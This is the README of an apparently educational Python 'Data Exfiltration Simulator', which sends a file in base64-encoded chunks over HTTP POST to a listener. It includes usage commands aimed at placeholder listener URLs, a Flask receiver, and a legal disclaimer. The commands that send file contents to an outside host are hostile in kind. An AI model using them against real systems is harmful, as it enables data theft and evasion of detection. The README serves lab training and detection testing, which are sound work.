# Data Exfiltration Simulator

⚠️ **LAB USE ONLY** - This tool is designed for isolated lab environments and educational purposes. Only use with dummy data and listeners you control.

## Overview

A data exfiltration simulation tool that demonstrates how data exfiltration attacks work in a controlled lab environment. Uses chunked HTTP POST requests to simulate exfiltration techniques.

## Features

- **Chunked Exfiltration**: Simulates chunked data exfiltration
- **HTTP POST**: Uses HTTP POST requests for data transfer
- **Base64 Encoding**: Encodes data in base64 format
- **Configurable**: Adjustable chunk size and delay
- **Lab-Safe**: Designed for isolated lab environments only

## Installation

### Requirements

- Python 3.8+
- Standard library only (no external dependencies!)

### Setup

```bash
# Clone the repository
git clone https://github.com/5h4d0wn1k/exfil-simulator.git
cd exfil-simulator

# No installation needed!
python exfil_simulator.py --help
```

## Usage

### Basic Usage

```bash
# Simulate exfiltration to lab listener
python exfil_simulator.py \
  --url http://your-lab-listener.com/receive \
  --file dummy_data.txt
```

### Advanced Usage

```bash
# Custom chunk size and delay
python exfil_simulator.py \
  --url http://your-lab-listener.com/receive \
  --file dummy_data.txt \
  --chunk-size 1024 \
  --delay 0.5
```

## Command-Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `--url` | Lab listener URL (required) | - |
| `--file` | Dummy data file to exfiltrate (required) | - |
| `--chunk-size` | Chunk size in bytes | 512 |
| `--delay` | Delay between chunks (seconds) | 0.2 |

## Listener Setup

You need to set up a listener to receive the exfiltrated data. Example using Python Flask:

```python
from flask import Flask, request
import base64
import json

app = Flask(__name__)

@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    chunk_data = base64.b64decode(data['data'])
    print(f"Received chunk {data['i']}: {chunk_data[:50]}...")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

## Output Format

```
⚠️  Lab-only. Point to a listener you control. Use dummy data only.
[+] Exfil simulation complete.
```

## Examples

### Example 1: Basic Simulation

```bash
# Simulate exfiltration
python exfil_simulator.py \
  --url http://localhost:8000/receive \
  --file test_data.txt
```

### Example 2: Custom Configuration

```bash
# Larger chunks with longer delay
python exfil_simulator.py \
  --url http://localhost:8000/receive \
  --file large_file.bin \
  --chunk-size 2048 \
  --delay 1.0
```

## Use Cases

- **Security Training**: Learn about data exfiltration techniques
- **Lab Testing**: Test detection mechanisms in lab environments
- **Educational Purposes**: Understand exfiltration attack patterns

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

---

## ⚠️ Legal Disclaimer

### Educational Purpose Only
This tool is provided strictly for **educational purposes** and **authorized security testing** only. It is intended to help security professionals and students learn about security concepts in controlled environments.

### Authorized Use Only
- You must have **explicit written authorization** before testing any system you do not own
- Unauthorized access to computer systems is **illegal** and punishable under laws including but not limited to the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, and similar legislation worldwide
- Only use this tool on systems you own, have permission to test, or in isolated lab environments

### No Warranty
This software is provided "AS IS" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. The author makes no representations or warranties regarding the accuracy, completeness, or reliability of this software.

### Limitation of Liability
**In no event shall the author (Nikhil Nagpure) be liable for any direct, indirect, incidental, special, exemplary, or consequential damages (including, but not limited to, procurement of substitute goods or services; loss of use, data, or profits; or business interruption) however caused and on any theory of liability, whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of the use of this software, even if advised of the possibility of such damage.**

### User Responsibility
- The user assumes **full responsibility** for any consequences resulting from the use of this tool
- The author is **not responsible** for any misuse, damage, or illegal activities performed with this software
- Users are solely responsible for ensuring compliance with all applicable local, state, national, and international laws and regulations

### Indemnification
By using this software, you agree to **indemnify, defend, and hold harmless** the author from and against any and all claims, liabilities, damages, losses, costs, and expenses (including reasonable attorneys fees) arising from or related to your use of this software.

### Responsible Disclosure
If you discover vulnerabilities using this tool, please follow responsible disclosure practices and report them to the affected parties through appropriate channels.

---

**By using this software, you acknowledge that you have read, understood, and agree to be bound by this disclaimer.**
## License

This project is for educational purposes only. Use responsibly and ethically.

---

**Remember**: Lab use only! Never use on production systems!
